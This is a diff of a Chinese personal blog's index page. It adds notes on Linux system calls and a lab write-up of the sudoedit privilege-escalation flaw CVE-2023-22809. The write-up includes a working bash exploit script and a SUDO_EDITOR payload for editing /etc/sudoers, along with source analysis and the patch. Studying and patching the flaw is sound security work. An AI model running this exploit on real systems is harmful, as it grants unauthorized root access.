@@ -156,6 +156,259 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/Untitled/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/Untitled/" class="post-title-link" itemprop="url">Untitled</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-08-27 18:50:44" itemprop="dateCreated datePublished" datetime="2023-08-27T18:50:44+08:00">2023-08-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/Linkers&Loaders04/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/Notes/Linkers&Loaders04/" class="post-title-link" itemprop="url">Chap12-系统调用</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-08-27 14:58:58 / Modified: 16:41:48" itemprop="dateCreated datePublished" datetime="2023-08-27T14:58:58+08:00">2023-08-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>/usr/include/unistd.h  一些系统调用的C语言形式定义</p>
+<p>/usr/include/asm-<em>/unistd</em>.h 存放系统调用号</p>
+<p>linux-5.6.18\arch\x86\kernel\traps.c x86的部分中断向量表</p>
+</blockquote>
+<p>绕过glibc获得更高的文件读写性能。</p>
+<p>为了兼容不同系统的系统调用（定义、实现会各不相同），增加一个抽象层——运行库（标准库），保证了源码级别的可移植性  。</p>
+<p>CRT只能取各个平台功能的交集。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov 2,eax ;把fork的系统调用号传到寄存器</span><br><span class="line">int 0x80 ;调用中断</span><br><span class="line">;中断服务程序从eax里取得系统调用号，</span><br><span class="line">;查表，eax=2</span><br><span class="line">;调用sys_fork函数</span><br></pre></td></tr></table></figure>
+<h3 id="1-触发中断"><a href="#1-触发中断" class="headerlink" title="1.触发中断"></a>1.触发中断</h3><p>x86下Linux支持的系统调用参数最多可以达到6个，分别用EBX、ECX、EDX、ESI、EDI、EBP存储。</p>
+<h3 id="2-堆栈切换"><a href="#2-堆栈切换" class="headerlink" title="2.堆栈切换"></a>2.堆栈切换</h3><p>用户态的ESP和SS的值保存在内核栈里。</p>
+<p>当0x80号中断nt 发生时，</p>
+<p>1.CPU切入内核态</p>
+<p>2.CPU找到当前进程的内核栈</p>
+<p>3.在内核栈中依次压入用户态的SS、ESP、EFLAGS、CS（环境）、EIP（返回地址）。</p>
+<blockquote>
+<p>当iret时，再依次弹出这些值到对应的寄存器里。</p>
+</blockquote>
+<h3 id="3-中断处理程序"><a href="#3-中断处理程序" class="headerlink" title="3.中断处理程序"></a>3.中断处理程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">INT x:</span><br><span class="line"></span><br><span class="line">根据x的值</span><br><span class="line"></span><br><span class="line">if x=00:  除0</span><br><span class="line"></span><br><span class="line">if x=0x14: 缺页</span><br><span class="line"></span><br><span class="line">if x=0x02 :硬件驱动</span><br><span class="line"></span><br><span class="line">if x=0x80: system_call</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​	eax=1 =&gt;sys_exit</span><br><span class="line"></span><br><span class="line">​	eax=2 =&gt;sys_fork</span><br><span class="line"></span><br><span class="line">​	eax=3 =&gt;sys_read</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/CVE-2023-22809/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/CVE-2023-22809/" class="post-title-link" itemprop="url">CVE-2023-22809 sudo提权漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-08-27 14:19:49 / Modified: 22:45:25" itemprop="dateCreated datePublished" datetime="2023-08-27T14:19:49+08:00">2023-08-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.shellcodes.org/Hacking/CVE-2023-22809%EF%BC%88sudoedit%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%89%E5%88%86%E6%9E%90.html">CVE-2023-22809（sudoedit权限提升漏洞）分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/uiAEnK5tqkKh0bqWPoTIKg">https://mp.weixin.qq.com/s/uiAEnK5tqkKh0bqWPoTIKg</a></p>
+</blockquote>
+<p>漏洞简介：Sudo中的sudoedit对处理用户提供的环境变量（如SUDO_EDITOR、VISUAL和EDITOR）中传递的额外参数存在缺陷。当用户指定的编辑器包含绕过sudoers策略的“–”参数时，拥有sudoedit访问权限的本地攻击者可以实现任意文件编辑 ，最终实现权限提升 。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">◆漏洞评分：7.8分</span><br><span class="line">◆影响版本：sudo 1.8.0-sudo 1.9.12p1(sudo&gt;=1.8.0 or sudo &lt;=1.9.12p1)</span><br></pre></td></tr></table></figure>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>VMware Ubuntu22 </p>
+<p>sudo-1.9.12p1</p>
+<p>test用户拥有执行sudoedit的能力，但不能执行sudo。</p>
+<h3 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h3><p>1.安装sudo-1.9.12p1/</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.sudo.ws/dist/sudo-1.9.12p1.tar.gz</span><br><span class="line">tar -zxvf ./sudo-1.9.12p1.tar.gz</span><br><span class="line">cd sudo-1.9.12p1/</span><br><span class="line">./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+<p> 2.设置test用户权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">useradd -m test #添加攻击用低权限用户</span><br><span class="line">passwd test -d  #设置为空密码</span><br><span class="line">vim /etc/sudoers  #给test sudoedit权限</span><br><span class="line">添加下面两行</span><br><span class="line">Cmnd_Alias SUDOEDIT = sudoedit /etc/custom_test.txt</span><br><span class="line">test ALL=(ALL:ALL) SUDOEDIT</span><br></pre></td></tr></table></figure>
+<p>此时sudoedit只能编辑/etc/custom_test.txt。</p>
+<p><img src="/categories/CTF/CVE-2023-22809/1693146377666.png" alt="1693146377666"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="1-EXP-记得行尾保存为Unix格式"><a href="#1-EXP-记得行尾保存为Unix格式" class="headerlink" title="1.EXP  记得行尾保存为Unix格式"></a>1.EXP  记得行尾保存为Unix格式</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! sudo --version | <span class="built_in">head</span> -1 | grep -qE <span class="string">&#x27;(1\.8.*|1\.9\.[0-9]1?(p[1-3])?|1\.9\.12p1)$&#x27;</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&gt; Currently installed sudo version is not vulnerable&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#判断sudoers里有无test ALL=(ALL:ALL) sudoedit</span></span><br><span class="line">EXPLOITABLE=$(sudo -l | grep -E <span class="string">&quot;sudoedit|sudo -e&quot;</span> | grep -E <span class="string">&#x27;\(root\)|\(ALL\)|\(ALL : ALL\)&#x27;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;)&#x27;</span> -f 2-)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$EXPLOITABLE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&gt; It doesn&#x27;t seem that this user can run sudoedit as root&quot;</span></span><br><span class="line">    <span class="built_in">read</span> -p <span class="string">&quot;Do you want to proceed anyway? (y/N): &quot;</span> confirm &amp;&amp; [[ <span class="variable">$confirm</span> == [yY] ]] || <span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&gt; BINGO! User exploitable&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&gt; Opening sudoers file, please add the following line to the file in order to do the privesc:&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$USER</span> ALL=(ALL:ALL) ALL&quot;</span></span><br><span class="line"><span class="built_in">read</span> -n 1 -s -r -p <span class="string">&quot;Press any key to continue...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$EXPLOITABLE</span>&quot;</span></span><br><span class="line"><span class="comment">#下面的payload实际上是EDITOR=&quot;vim -- /etc/sudoers&quot; sudoedit</span></span><br><span class="line">EDITOR=<span class="string">&quot;vim -- /etc/sudoers&quot;</span> <span class="variable">$EXPLOITABLE</span></span><br><span class="line">sudo su root</span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
+<p>2.在上面的exp运行时，按两下回车，会自动打开sudoers的编辑界面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将之前的</span><br><span class="line">test ALL=(ALL:ALL) sudoedit</span><br><span class="line">改为--&gt;</span><br><span class="line">test ALL=(ALL:ALL) ALL</span><br><span class="line">保存退出</span><br></pre></td></tr></table></figure>
+<p>此时，如果不对sudoers进行编辑，退出时会发现，此时执行了三次sudoedit。</p>
+<p><img src="/categories/CTF/CVE-2023-22809/1693146781832.png" alt="1693146781832"></p>
+<p>3.返回运行exp的界面，回车继续运行。</p>
+<p><img src="/categories/CTF/CVE-2023-22809/1693142053286.png" alt="1693142053286"></p>
+<p>成功提权。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p> sudoedit —&gt; plugins/sudoers/editor.c的 find_editor函数—-&gt;resolve_editor</p>
+<p>执行 sudoedit 时，会调用 plugins/sudoers/editor.c 中的 find_editor 函数，find_editor 会根据 SUDO_EDITOR、VISUAL、EDITOR 三个环境变量设置的编辑器来指定编辑器：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *</span><br><span class="line"><span class="title function_">find_editor</span><span class="params">(<span class="type">int</span> nfiles, <span class="type">char</span> **files, <span class="type">int</span> *argc_out, <span class="type">char</span> ***argv_out,</span></span><br><span class="line"><span class="params">            <span class="type">char</span> * <span class="type">const</span> *allowlist, <span class="type">const</span> <span class="type">char</span> **env_editor)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    *env_editor = <span class="literal">NULL</span>;</span><br><span class="line">    ev[<span class="number">0</span>] = <span class="string">&quot;SUDO_EDITOR&quot;</span>;</span><br><span class="line">    ev[<span class="number">1</span>] = <span class="string">&quot;VISUAL&quot;</span>;</span><br><span class="line">    ev[<span class="number">2</span>] = <span class="string">&quot;EDITOR&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nitems(ev); i++) &#123;</span><br><span class="line">        <span class="type">char</span> *editor = getenv(ev[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (editor != <span class="literal">NULL</span> &amp;&amp; *editor != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">            *env_editor = editor;</span><br><span class="line">            <span class="comment">/* 解析环境变量的值 */</span></span><br><span class="line">            editor_path = resolve_editor(editor, <span class="built_in">strlen</span>(editor),</span><br><span class="line">                                         nfiles, files, argc_out, argv_out, allowlist);</span><br><span class="line">            <span class="keyword">if</span> (editor_path != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (errno != ENOENT)</span><br><span class="line">                debug_return_str(<span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果设置了环境变量，就调用 resolve_editor 函数去解析，问题就出在这个函数中，以下为关键代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *</span><br><span class="line"><span class="title function_">resolve_editor</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *ed, <span class="type">size_t</span> edlen, <span class="type">int</span> nfiles, <span class="type">char</span> **files,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> *argc_out, <span class="type">char</span> ***argv_out, <span class="type">char</span> * <span class="type">const</span> *allowlist)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"><span class="comment">//从编辑器名称（vim）后的字符串直接开始，通过wordsplit来计算参数（nargc）的数量。</span></span><br><span class="line">    <span class="keyword">for</span> (nargc = <span class="number">1</span>, tmp = ep; wordsplit(<span class="literal">NULL</span>, edend, &amp;tmp) != <span class="literal">NULL</span>; )</span><br><span class="line">        nargc++;</span><br><span class="line">    <span class="keyword">if</span> (nfiles != <span class="number">0</span>)</span><br><span class="line">        nargc += nfiles + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//根据参数数量申请对应大小的空间（nfiles即要编辑的文件数量）</span></span><br><span class="line">    nargv = reallocarray(<span class="literal">NULL</span>, nargc + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="type">char</span> *));</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill in editor argv (assumes files[] is NULL-terminated). */</span></span><br><span class="line">    nargv[<span class="number">0</span>] = editor;</span><br><span class="line">    editor = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//把参数拷贝到nargv数组中</span></span><br><span class="line">    <span class="keyword">for</span> (nargc = <span class="number">1</span>; (cp = wordsplit(<span class="literal">NULL</span>, edend, &amp;ep)) != <span class="literal">NULL</span>; nargc++) &#123;</span><br><span class="line">        <span class="comment">/* Copy string, collapsing chars escaped with a backslash. */</span></span><br><span class="line">        nargv[nargc] = copy_arg(cp, ep - cp);</span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">//nargv[]=&#123;&#x27;vim&#x27;,&#x27;--&#x27;,&#x27;/etc/sudoers&#x27;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nfiles != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//出问题的点</span></span><br><span class="line">        nargv[nargc++] = (<span class="type">char</span> *)<span class="string">&quot;--&quot;</span>;</span><br><span class="line">        <span class="comment">//nargv[]=&#123;&#x27;vim&#x27;,&#x27;--&#x27;,&#x27;/etc/sudoers&#x27;,&#x27;--&#x27;&#125;</span></span><br><span class="line">        <span class="keyword">while</span> (nfiles--)</span><br><span class="line">            nargv[nargc++] = *files++;</span><br><span class="line">         <span class="comment">//nargv[]=&#123;&#x27;vim&#x27;,&#x27;--&#x27;,&#x27;/etc/sudoers&#x27;,&#x27;--&#x27;,&#x27;/etc/custom_test.txt&#x27;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">    nargv[nargc] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    *argc_out = nargc;</span><br><span class="line">    *argv_out = nargv;<span class="comment">//最后的输出部分，用于接下来的sudoedit</span></span><br><span class="line">    <span class="comment">//此时，nargv[3]=&#x27;--&#x27;</span></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以如果执行 Payload：</p>
+<p>最后一步：sudo_edit</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">最后一步：sudo_edit</span><br><span class="line"></span><br><span class="line"><span class="comment">// src/sudo_edit.c@sudo_edit()</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">sudo_edit</span><span class="params">(<span class="keyword">struct</span> command_details *command_details)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Set real, effective and saved uids to root.</span></span><br><span class="line"><span class="comment">* We will change the euid as needed below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="comment">//设置了ROOT权限和临时可写目录</span></span><br><span class="line">    setuid(ROOT_UID);</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"><span class="comment">/* Find a temporary directory writable by the user. */</span></span><br><span class="line">    set_tmpdir(&amp;user_details.cred);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * The user&#x27;s editor must be separated from the files to be</span></span><br><span class="line"><span class="comment">    * edited by a &quot;--&quot; option.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="comment">//argv[]=&#123;&#x27;vim&#x27;,&#x27;--&#x27;,&#x27;/etc/sudoers&#x27;,&#x27;--&#x27;,&#x27;/etc/custom_test.txt&#x27;&#125;</span></span><br><span class="line"><span class="keyword">for</span> (ap = command_details-&gt;argv; *ap != <span class="literal">NULL</span>; ap++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (files)</span><br><span class="line">        nfiles++;</span><br><span class="line">    <span class="comment">//命令行参数与--比较，如果相同则将下一个内容视为要编辑的文件名</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(*ap, <span class="string">&quot;--&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        files = ap + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        editor_argc++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUDO_EDITOR=<span class="string">&#x27;vim -- /etc/sudoers&#x27;</span> sudoedit /etc/custom_test.txt</span><br></pre></td></tr></table></figure>
+<p> 其中的“—”就会让/etc/sudoers对应的临时文件可以被编辑，从进程中也能看到： </p>
+<p><img src="/categories/CTF/CVE-2023-22809/1693147033838.png" alt="1693147033838"></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/sudo-project/sudo/commit/0274a4f3b403162a37a10f199c989f3727ed3ad4">https://github.com/sudo-project/sudo/commit/0274a4f3b403162a37a10f199c989f3727ed3ad4</a></p>
+</blockquote>
+<p> 如果出现以下提示，说明漏洞已经修复： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * We use &quot;--&quot; to separate the editor and arguments from the files</span><br><span class="line"> * to edit.  The editor arguments themselves may not contain &quot;--&quot;.</span><br><span class="line"> */</span><br><span class="line">if (strcmp(nargv[nargc], &quot;--&quot;) == 0) &#123;</span><br><span class="line">    sudo_warnx(U_(&quot;ignoring editor: %.*s&quot;), (int)edlen, ed);</span><br></pre></td></tr></table></figure>
+<p><img src="/categories/CTF/CVE-2023-22809/1693140214261.png" alt="1693140214261"></p>
+<h3 id="简单补丁"><a href="#简单补丁" class="headerlink" title="简单补丁"></a>简单补丁</h3><p> 把受影响的环境变量添加到拒绝列表中。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">defaults!SUDOEDIT env_delete+=&quot;SUDO_EDITOR VISUAL EDITOR&quot;</span><br><span class="line">Cmnd_Alias SUDOEDIT = sudoedit /etc/custom/service.conf</span><br><span class="line">user ALL=(ALL:ALL) SUDOEDIT</span><br></pre></td></tr></table></figure>
+<p> 通过sudoedit命令仅编辑<code>/etc/custom/service.conf</code>文件，并且您希望禁用他们使用<code>SUDO_EDITOR</code>、<code>VISUAL</code>和<code>EDITOR</code>这些环境变量来更改默认编辑器。 </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/PE%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E7%9A%84%E7%A7%BB%E6%A4%8D/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -927,368 +1180,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/ML/Few-Shot19/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/ML/Few-Shot19/" class="post-title-link" itemprop="url">利用三阶段特征选择和数据不平衡纠正增强勒索软件分类</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-07-31 16:13:22 / Modified: 17:16:32" itemprop="dateCreated datePublished" datetime="2023-07-31T16:13:22+08:00">2023-07-31</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ML/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>勒索软件维度太多、数据不平衡，不容易建立模型。</p>
